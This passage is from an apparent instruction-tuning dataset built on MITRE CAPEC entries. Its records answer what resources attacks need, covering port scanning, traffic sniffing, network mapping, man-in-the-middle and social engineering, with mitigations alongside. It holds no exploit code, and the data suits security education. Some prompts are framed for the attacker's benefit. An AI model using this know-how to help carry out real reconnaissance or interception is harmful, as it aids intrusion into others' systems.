              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Influence Perception (CAPEC ID: 417)",
    "context": "",
    "output": "The resources required to execute Influence Perception (CAPEC ID: 417) are the following: There are no necessary resources required for this attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "There are no necessary resources required for this attack.",
      "@Name": "Influence Perception (CAPEC ID: 417)",
      "attack_ptrn": {
        "@ID": "417",
        "@Name": "Influence Perception",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "The adversary uses social engineering to exploit the target's perception of the relationship between the adversary and themselves. This goal is to persuade the target to unknowingly perform an action or divulge information that is advantageous to the adversary.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "416"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have the means and knowledge of how to communicate with the target in some manner."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary requires strong inter-personal and communication skills."
          }
        },
        "Resources_Required": {
          "Resource": "There are no necessary resources required for this attack."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Integrity",
              "Availability"
            ],
            "Impact": "Other",
            "Note": "Attacks that influence the perception of the target can result in a wide variety of consequences and negatively affect potentially the confidentiality, availability, and/or integrity of an application or system."
          }
        },
        "Mitigations": {
          "Mitigation": "An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks."
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-348"
            },
            {
              "@External_Reference_ID": "REF-360"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2017-08-04",
            "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
          },
          "Previous_Entry_Name": {
            "@Date": "2017-08-04",
            "#text": "Target Influence via Perception of Reciprocation"
          }
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: TCP Initial Window Size Probe (CAPEC ID: 326)",
    "context": "",
    "output": "The resources required to execute TCP Initial Window Size Probe (CAPEC ID: 326) are the following: A tool capable of sending and receiving packets from a remote system.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool capable of sending and receiving packets from a remote system.",
      "@Name": "TCP Initial Window Size Probe (CAPEC ID: 326)",
      "attack_ptrn": {
        "@ID": "326",
        "@Name": "TCP Initial Window Size Probe",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "This OS fingerprinting probe checks the initial TCP Window size. TCP stacks limit the range of sequence numbers allowable within a session to maintain the \"connected\" state within TCP protocol logic. The initial window size specifies a range of acceptable sequence numbers that will qualify as a response to an ACK packet within a session. Various operating systems use different Initial window sizes. The initial window size can be sampled by establishing an ordinary TCP connection.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "312"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card."
        },
        "Resources_Required": {
          "Resource": "A tool capable of sending and receiving packets from a remote system."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-212",
              "@Section": "Chapter 8. Remote OS Detection"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Port Scanning (CAPEC ID: 300)",
    "context": "",
    "output": "The resources required to execute Port Scanning (CAPEC ID: 300) are the following: The adversary requires a network mapping/scanning tool, or must conduct socket programming on the command line. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary requires a network mapping/scanning tool, or must conduct socket programming on the command line. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
      "@Name": "Port Scanning (CAPEC ID: 300)",
      "attack_ptrn": {
        "@ID": "300",
        "@Name": "Port Scanning",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An adversary uses a combination of techniques to determine the state of the ports on a remote target. Any service or application available for TCP or UDP networking will have a port open for communications over the network.",
        "Extended_Description": {
          "xhtml:p": [
            "Although common services have assigned port numbers, services and applications can run on arbitrary ports. Additionally, port scanning is complicated by the potential for any machine to have up to 65535 possible UDP or TCP services. The goal of port scanning is often broader than identifying open ports, but also give the adversary information concerning the firewall configuration.",
            "Depending upon the method of scanning that is used, the process can be stealthy or more obtrusive, the latter being more easily detectable due to the volume of packets involved, anomalous packet traits, or system logging. Typical port scanning activity involves sending probes to a range of ports and observing the responses. There are four port statuses that this type of attack aims to identify: open, closed, filtered, and unfiltered. For strategic purposes it is useful for an adversary to distinguish between an open port that is protected by a filter vs. a closed port that is not protected by a filter. Making these fine grained distinctions is requires certain scan types. Collecting this type of information tells the adversary which ports can be attacked directly, which must be attacked with filter evasion techniques like fragmentation, source port scans, and which ports are unprotected (i.e. not firewalled) but aren't hosting a network service. An adversary often combines various techniques in order to gain a more complete picture of the firewall filtering mechanisms in place for a host."
          ]
        },
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "169"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary requires logical access to the target's network in order to carry out this type of attack."
        },
        "Resources_Required": {
          "Resource": "The adversary requires a network mapping/scanning tool, or must conduct socket programming on the command line. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1046",
            "Entry_Name": "Network Service Scanning"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 54"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-158"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 4.1 Introduction to Port Scanning, pg. 73"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Notes": {
          "Note": {
            "@Type": "Other",
            "#text": "There are four types of port status that this type of attack aims to identify: 1) Open Port: The port is open and a firewall does not block access to the port, 2) Closed Port: The port is closed (i.e. no service resides there) and a firewall does not block access to the port, 3) Filtered Port: A firewall or ACL rule is blocking access to the port in some manner, although the presence of a listening service on the port cannot be verified, and 4) Unfiltered Port: A firewall or ACL rule is not blocking access to the port, although the presence of a listening service on the port cannot be verified."
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Notes"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Network Topology Mapping (CAPEC ID: 309)",
    "context": "",
    "output": "The resources required to execute Network Topology Mapping (CAPEC ID: 309) are the following: Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.",
      "@Name": "Network Topology Mapping (CAPEC ID: 309)",
      "attack_ptrn": {
        "@ID": "309",
        "@Name": "Network Topology Mapping",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary engages in scanning activities to map network nodes, hosts, devices, and routes. Adversaries usually perform this type of network reconnaissance during the early stages of attack against an external network. Many types of scanning utilities are typically employed, including ICMP tools, network mappers, port scanners, and route testing utilities such as traceroute.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "169",
              "Exclude_Related": {
                "@Exclude_ID": "512"
              }
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "664"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "None"
        },
        "Resources_Required": {
          "Resource": "Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Other"
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1016",
              "Entry_Name": "System Network Configuration Discovery"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1049",
              "Entry_Name": "System Network Connections Discovery"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1590",
              "Entry_Name": "Gather Victim Network Information"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Sniffing Network Traffic (CAPEC ID: 158)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Sniffing Network Traffic (CAPEC ID: 158):\nA tool with the capability of presenting network communication traffic (e.g., Wireshark, tcpdump, Cain and Abel, etc.).",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool with the capability of presenting network communication traffic (e.g., Wireshark, tcpdump, Cain and Abel, etc.).",
      "@Name": "Sniffing Network Traffic (CAPEC ID: 158)",
      "attack_ptrn": {
        "@ID": "158",
        "@Name": "Sniffing Network Traffic",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "In this attack pattern, the adversary monitors network traffic between nodes of a public or multicast network in an attempt to capture sensitive information at the protocol level. Network sniffing applications can reveal TCP/IP, DNS, Ethernet, and other low-level network communication information. The adversary takes a passive role in this attack pattern and simply observes and analyzes the traffic. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the target information.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "157"
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target must be communicating on a network protocol visible by a network sniffing application.",
            "The adversary must obtain a logical position on the network from intercepting target network traffic is possible. Depending on the network topology, traffic sniffing may be simple or challenging. If both the target sender and target recipient are members of a single subnet, the adversary must also be on that subnet in order to see their traffic communication."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Adversaries can obtain and set up open-source network sniffing tools easily."
          }
        },
        "Resources_Required": {
          "Resource": "A tool with the capability of presenting network communication traffic (e.g., Wireshark, tcpdump, Cain and Abel, etc.)."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Obfuscate network traffic through encryption to prevent its readability by network sniffers.",
            "Employ appropriate levels of segmentation to your network in accordance with best practices."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "311"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1040",
              "Entry_Name": "Network Sniffing"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1111",
              "Entry_Name": "Multi-Factor Authentication Interception"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Description Summary, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Choosing Message Identifier (CAPEC ID: 12), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nThe adversary needs the ability to control source code or application configuration responsible for selecting which message/channel id is absorbed from the public distribution means.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary needs the ability to control source code or application configuration responsible for selecting which message/channel id is absorbed from the public distribution means.",
      "@Name": "Choosing Message Identifier (CAPEC ID: 12)",
      "attack_ptrn": {
        "@ID": "12",
        "@Name": "Choosing Message Identifier",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "This pattern of attack is defined by the selection of messages distributed via multicast or public information channels that are intended for another client by determining the parameter value assigned to that client. This attack allows the adversary to gain access to potentially privileged information, and to possibly perpetrate other attacks through the distribution means by impersonation. If the channel/message being manipulated is an input rather than output mechanism for the system, (such as a command bus), this style of attack could be used to change the adversary's identifier to more a privileged one.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "21"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "216"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine Nature of Messages] Determine the nature of messages being transported as well as the identifiers to be used as part of the attack"
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Authenticate] If required, authenticate to the distribution channel"
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Identify Known Client Identifiers] If any particular client's information is available through a control channel available to all users, the adversary will discover particular identifiers for targeted clients by observing this channel, or requesting client information through this channel."
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Change Message Identifier] Adversaries with client access connecting to output channels could change their channel identifier and see someone else's (perhaps more privileged) data."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Information and client-sensitive (and client-specific) data must be present through a distribution channel available to all users.",
            "Distribution means must code (through channel, message identifiers, or convention) message destination in a manner visible within the distribution means itself (such as a control channel) or in the messages themselves."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "All the adversary needs to discover is the format of the messages on the channel/distribution means and the particular identifier used within the messages."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary needs the ability to control source code or application configuration responsible for selecting which message/channel id is absorbed from the public distribution means."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            {
              "xhtml:p": [
                "Associate some ACL (in the form of a token) with an authenticated user which they provide middleware. The middleware uses this token as part of its channel/message selection for that client, or part of a discerning authorization decision for privileged channels/messages.",
                "The purpose is to architect the system in a way that associates proper authentication/authorization with each channel/message."
              ]
            },
            "Re-architect system input/output channels as appropriate to distribute self-protecting data. That is, encrypt (or otherwise protect) channels/messages so that only authorized readers can see them."
          ]
        },
        "Example_Instances": {
          "Example": "A certain B2B interface on a large application codes for messages passed over an MQSeries queue, on a single \"Partners\" channel. Messages on that channel code for their client destination based on a partner_ID field, held by each message. That field is a simple integer. Adversaries having access to that channel, perhaps a particularly nosey partner, can simply choose to store messages of another partner's ID and read them as they desire. Note that authentication does not prevent a partner from leveraging this attack on other partners. It simply disallows adversaries without partner status from conducting this attack."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "201"
            },
            {
              "@CWE_ID": "306"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, Resources_Required, Skills_Required"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-12-07",
            "#text": "Choosing a Message/Channel Identifier on a Public/Multicast Channel"
          }
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: TCP Connect Scan (CAPEC ID: 301)",
    "context": "",
    "output": "The resources required to execute TCP Connect Scan (CAPEC ID: 301) are the following: The adversary can leverage a network mapper or scanner, or perform this attack via routine socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network to see the response.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary can leverage a network mapper or scanner, or perform this attack via routine socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network to see the response.",
      "@Name": "TCP Connect Scan (CAPEC ID: 301)",
      "attack_ptrn": {
        "@ID": "301",
        "@Name": "TCP Connect Scan",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary uses full TCP connection attempts to determine if a port is open on the target system. The scanning process involves completing a 'three-way handshake' with a remote port, and reports the port as closed if the full handshake cannot be established. An advantage of TCP connect scanning is that it works against any TCP/IP stack.",
        "Extended_Description": {
          "xhtml:p": "RFC 793 defines how TCP connections are established and torn down. TCP connect scanning commonly involves establishing a full connection, and then subsequently tearing it down, and therefore involves sending a significant number of packets to each port that is scanned. Compared to other types of scans, a TCP Connect scan is slow and methodical. This type of scanning causes considerable noise in system logs and can be spotted by IDS/IPS systems. TCP Connect scanning can detect when a port is open by completing the three-way handshake, but it cannot distinguish a port that is unfiltered with no service running on it from a port that is filtered by a firewall but contains an active service. Due to the significant volume of packets exchanged per port, TCP connect scanning can become very time consuming (performing a full TCP connect scan against a host can take multiple days). Generally, it is not used as a method for performing a comprehensive port scan, but is reserved for checking a short list of common ports."
        },
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "300"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "An adversary attempts to initialize a TCP connection with with the target port."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "An adversary uses the result of their TCP connection to determine the state of the target port. A successful connection indicates a port is open with a service listening on it while a failed connection indicates the port is not open."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary requires logical access to the target network. The TCP connect Scan requires the ability to connect to an available port and complete a 'three-way-handshake' This scanning technique does not require any special privileges in order to perform. This type of scan works against all TCP/IP stack implementations."
        },
        "Resources_Required": {
          "Resource": "The adversary can leverage a network mapper or scanner, or perform this attack via routine socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network to see the response."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": "Employ a robust network defense posture that includes an IDS/IPS system."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 54"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 5.3 TCP Connect Scanning, pg. 100"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Application API Message Manipulation via Man-in-the-Middle (CAPEC ID: 384)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Application API Message Manipulation via Man-in-the-Middle (CAPEC ID: 384):\nA software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.",
      "@Name": "Application API Message Manipulation via Man-in-the-Middle (CAPEC ID: 384)",
      "attack_ptrn": {
        "@ID": "384",
        "@Name": "Application API Message Manipulation via Man-in-the-Middle",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack can allow the attacker to gain unauthorized privileges within the application, or conduct attacks such as phishing, deceptive strategies to spread malware, or traditional web-application attacks. The techniques require use of specialized software that allow the attacker to perform adversary-in-the-middle (CAPEC-94) communications between the web browser and the remote system. Despite the use of AiTH software, the attack is actually directed at the server, as the client is one node in a series of content brokers that pass information along to the application framework. Additionally, it is not true \"Adversary-in-the-Middle\" attack at the network layer, but an application-layer attack the root cause of which is the master applications trust in the integrity of code supplied by the client.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "94"
          }
        },
        "Prerequisites": {
          "Prerequisite": "Targeted software is utilizing application framework APIs"
        },
        "Resources_Required": {
          "Resource": "A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "471"
            },
            {
              "@CWE_ID": "345"
            },
            {
              "@CWE_ID": "346"
            },
            {
              "@CWE_ID": "602"
            },
            {
              "@CWE_ID": "311"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-327"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated @Abstraction"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Web Services Protocol Manipulation (CAPEC ID: 278)",
    "context": "",
    "output": "The resources required to execute Web Services Protocol Manipulation (CAPEC ID: 278) are the following: The attacker must be able to manipulate the communications to the targeted application or service.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
